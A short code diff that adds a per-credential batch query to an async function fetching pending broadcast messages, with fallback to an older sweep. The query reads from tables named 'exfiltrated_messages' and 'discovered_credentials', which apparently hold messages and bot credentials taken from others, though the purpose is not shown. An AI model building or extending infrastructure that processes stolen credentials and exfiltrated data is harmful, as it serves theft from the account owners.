@@ -262,6 +262,26 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> li
     PostgREST statement timeout; the previous single heavy query timed out
     (57014) once the sweep window grew.
     """
+    if os.getenv("BROADCAST_STRICT_PER_TOPIC_ORDER", "1") == "1":
+        try:
+            response = await async_execute(
+                db.rpc("oldest_pending_per_credential", {"p_limit": max(1, batch_size)})
+            )
+            oldest_rows = response.data or []
+            if oldest_rows:
+                ids = [row["id"] for row in oldest_rows]
+                hydrated = await async_execute(
+                    db.table("exfiltrated_messages")
+                    .select("*, discovered_credentials!inner(meta,bot_username)")
+                    .in_("id", ids)
+                )
+                by_id = {row["id"]: row for row in (hydrated.data or [])}
+                return [by_id[row_id] for row_id in ids if row_id in by_id]
+        except Exception as exc:  # noqa: BLE001 - fall back to the legacy sweep
+            logger.warning(
+                f"[Broadcast] per-topic batch query unavailable, using legacy sweep: {exc}"
+            )
+
     window = min(max(batch_size * 4, 200), 600)
 
     def _light():
